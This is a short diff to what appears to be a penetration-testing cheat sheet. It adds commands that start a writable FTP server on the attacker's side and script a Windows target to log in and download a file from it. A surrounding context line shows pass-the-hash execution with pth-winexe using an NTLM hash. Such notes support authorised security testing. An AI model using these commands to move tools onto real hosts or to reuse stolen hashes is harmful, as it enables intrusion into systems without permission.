@@ -3213,7 +3213,17 @@ pth-winexe -U domain_here/user_name_here%LM+NTLM_hash_here //SMB_share_here comm
 #!/usr/bin/env python3
 
 # FTP server
-python3 -m pyftpdlib -p 21
+## server
+python3 -m pyftpdlib -p 21 -w
+## target : prepare comamnds
+echo "open IP_here" > ftp.txt
+echo "USER username_here" >> ftp.txt
+echo "PASS password_here" >> ftp.txt
+echo binary >> ftp.txt
+echo "GET filename_here" >> ftp.txt
+echo bye >> ftp.txt
+## target : run commands
+ftp -v -n -s:ftp.txt
 
 # HTTP server
 python -m SimpleHTTPServer 80
